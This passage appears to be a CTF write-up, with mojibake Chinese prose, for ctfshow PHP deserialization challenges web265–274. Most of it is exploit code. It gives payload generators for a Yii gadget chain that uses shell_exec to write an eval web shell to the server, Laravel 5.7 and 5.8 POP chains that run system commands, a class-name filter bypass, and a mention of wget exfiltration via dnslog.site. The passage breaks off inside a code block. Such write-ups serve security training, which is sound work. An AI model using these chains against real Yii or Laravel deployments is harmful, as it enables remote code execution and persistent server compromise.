class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = &amp;<span class="keyword">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshowAdmin();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥çš„åˆ°flagã€‚</p><h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@unserialize(<span class="variable">$cs</span>);</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°é¢˜åå‘ç°æœ¬é¢˜å°†ctfshowè¿‡æ»¤ï¼Œå¯ä»¥åˆ¤æ–­éœ€è¦ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°å¤§ä½¬åšå®¢å‘ç°PHPå¯¹ç±»çš„å‘½åä¸åŒºåˆ†å¤§å°å†™ï¼Œå› æ¬¡ç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> CTFshow());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(<span class="string">&#x27;php://input&#x27;</span>)</span><br><span class="line"><span class="comment">//è¯¥å‡½æ•°å¯ä»¥è¿›è¡Œå¦‚åŒpostä¸€æ ·çš„å‚æ•°ï¼Œå› æ­¤ç›´æ¥æŠ“åŒ…ã€‚åœ¨åŒ…ä¸­ä¼ å‚ã€‚</span></span><br><span class="line"><span class="comment">//ä»–ä¸postå¹¶ä¸ç›¸åŒï¼Œå…·ä½“çš„ä¸åŒçœ‹åšå®¢</span></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_30950237/article/details/99639508?ops_request_misc=&request_id=&biz_id=102&utm_term=file_get_contents(%27php://input&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-8-99639508.pc_search_all_es&spm=1018.2226.3001.4187">file_get_contents(â€˜php://inputâ€™) å’ŒPOSTçš„åŒºåˆ«</a></p><h2 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h2><p>å…ˆè¿›è¡Œå¼±å£ä»¤ç™»å½•åˆ°é¡µé¢ï¼Œè§‚å¯Ÿåˆ°æºç ä¸­æœ‰?view-source<br>ä¹‹ååœ¨urlæ·»åŠ <br>?r=backdoor/shell&amp;code=xxxxx;<br>ä¹‹ååœ¨æºç å‘ç°è¯¥æ„æ¶ä¸ºyiiï¼Œå¯ä»¥æƒ³åˆ°yiiååºåˆ—åŒ–æ¼æ´<br>ç”¨ç½‘ä¸Šé€šç”¨çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-05-03 21:55:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-05-04 01:10:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;shell_exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id =  <span class="string">&quot;echo &#x27;&lt;?php eval(\$_POST[1]);?&gt;;phpinfo()&#x27; &gt; /var/www/html/basic/web/1.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä»£ç è·‘å®Œä¹‹åï¼Œä¾¿å¯ä»¥çœ‹æ˜¯å¦æœ‰1.phpå­˜åœ¨ï¼Œåœ¨1.phpä¸­æ“ä½œã€‚<br>ï¼ˆæœ‰ä¸€ç‚¹éœ€è¦äº†è§£ï¼šåœ¨æµ‹è¯•çš„è¿‡ç¨‹ä¸­éœ€è¦ç”¨åˆ°dnslog.siteè¿™ä¸ªç½‘å€ã€‚<br>ç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wget `xx`.äºŒçº§åŸŸå</span></span><br></pre></td></tr></table></figure><p>ä¸æ‡‚å¯ä»¥çœ‹biliä¸Šå¸ˆå‚…è®²è§£ã€‚<br><a href="https://www.bilibili.com/video/BV1D64y1m78f?p=14">wpè§†é¢‘</a></p><h2 id="web-268-270"><a href="#web-268-270" class="headerlink" title="web 268~270"></a>web 268~270</h2><p>å½“systemæ— æ³•ä½¿ç”¨å¯ä»¥ä½¿ç”¨passthru()å‡½æ•°<br>æœ¬ä½“ç”¨ä¸Šé¢˜é“¾æ— æ³•ä½¿ç”¨<br>çœ‹å¤§å¸ˆå‚…çš„å¦å¤–çš„å‡ æ¡é“¾<br><a href="https://blog.csdn.net/rfrder/article/details/113824239">fengå¸ˆå‚…çš„yiiæ¼æ´å¤ç°</a></p><h2 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Laravel - A PHP Framework For Web Artisans</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span>  Laravel</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>   Taylor Otwell &lt;taylor<span class="doctag">@laravel</span>.com&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">&#x27;LARAVEL_START&#x27;</span>, microtime(<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Register The Auto Loader</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Composer provides a convenient, automatically generated class loader for</span></span><br><span class="line"><span class="comment">| our application. We just need to utilize it! We&#x27;ll simply require it</span></span><br><span class="line"><span class="comment">| into the script here so that we don&#x27;t have to worry about manual</span></span><br><span class="line"><span class="comment">| loading any of our classes later on. It feels great to relax.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Turn On The Lights</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| We need to illuminate PHP development, so let us turn on the lights.</span></span><br><span class="line"><span class="comment">| This bootstraps the framework and gets it ready for use, then it</span></span><br><span class="line"><span class="comment">| will load up this application so that we can run it and send</span></span><br><span class="line"><span class="comment">| the responses back to the browser and delight our users.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">require_once</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/../bootstrap/app.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">| Run The Application</span></span><br><span class="line"><span class="comment">|--------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Once we have the application, we can handle the incoming request</span></span><br><span class="line"><span class="comment">| through the kernel, and send the associated response back to</span></span><br><span class="line"><span class="comment">| the client&#x27;s browser allowing them to enjoy the creative</span></span><br><span class="line"><span class="comment">| and wonderful application we have prepared for them.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$kernel</span> = <span class="variable">$app</span>-&gt;make(Illuminate\Contracts\Http\Kernel::class);</span><br><span class="line"><span class="variable">$response</span> = <span class="variable">$kernel</span>-&gt;handle(</span><br><span class="line">    <span class="variable">$request</span> = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br><span class="line">@unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$kernel</span>-&gt;terminate(<span class="variable">$request</span>, <span class="variable">$response</span>);</span><br></pre></td></tr></table></figure><p>é€šè¿‡é¢˜ç›®å¯ä»¥çœ‹åˆ°æ¡†æ¶ä¸º Laravelæ¡†æ¶ï¼Œ<br>ç•™ä¼ å…·æœ‰ååºåˆ—åŒ–çš„è¿™ç±»æ¡†æ¶æœ‰Laravel5.7å’ŒLaravel5.8.<br>çœ‹fengå¸ˆå‚…åšå®¢<a href="https://blog.csdn.net/rfrder/article/details/113826483">5.7ååºåˆ—åŒ–æ¼æ´å¤ç°</a><br>é€šè¿‡pocé“¾ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>\<span class="title">GenericUser</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Application</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingCommand</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters[]=<span class="string">&quot;cat /fl*&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test=<span class="keyword">new</span> GenericUser();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app=<span class="keyword">new</span> Application();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">bindings</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&#x27;concrete&#x27;</span>=&gt;<span class="string">&#x27;Illuminate\Foundation\Application&#x27;</span></span><br><span class="line">                )</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenericUser</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;attributes[<span class="string">&#x27;expectedOutput&#x27;</span>]=[<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;attributes[<span class="string">&#x27;expectedQuestions&#x27;</span>]=[<span class="string">&#x27;hello&#x27;</span>,<span class="string">&#x27;world&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>\<span class="title">PendingCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> PendingCommand()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web272-273"><a href="#web272-273" class="headerlink" title="web272~273"></a>web272~273</h2><p>ä¸Šä¸€é¢˜æ˜¯laravel5.7ï¼Œè¿™ä¸€é¢˜æ˜¯laravel5.8ååºåˆ—åŒ–æ¼æ´ã€‚<br>çœ‹fengå¸ˆå‚…åšå®¢<br><a href="https://blog.csdn.net/rfrder/article/details/113835057">laravel5.8 ååºåˆ—åŒ–æ¼æ´å¤ç°</a><br>çœ‹å¸ˆå‚…å†™çš„pocï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>\<span class="title">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=<span class="keyword">new</span> Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event=<span class="keyword">new</span> QueuedCommand();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>=&quot;<span class="title">cat</span> /<span class="title">flag</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>=&quot;<span class="title">system</span>&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>\<span class="title">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> PendingBroadcast()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h2><p><img src="https://img-blog.csdnimg.cn/86016933291847abbcc97fac63214898.png"><br>è¿›å…¥ä¸»é¡µçœ‹åˆ°æºç å‘ç°è¾“å…¥ç‚¹ï¼Œ<br>çœ‹fengå¸ˆå‚…åšå®¢<br><a href="https://blog.csdn.net/rfrder/article/details/113843768">thinkphpååºåˆ—åŒ–æ¼æ´</a><br>fengå¸ˆå‚…çš„pocï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 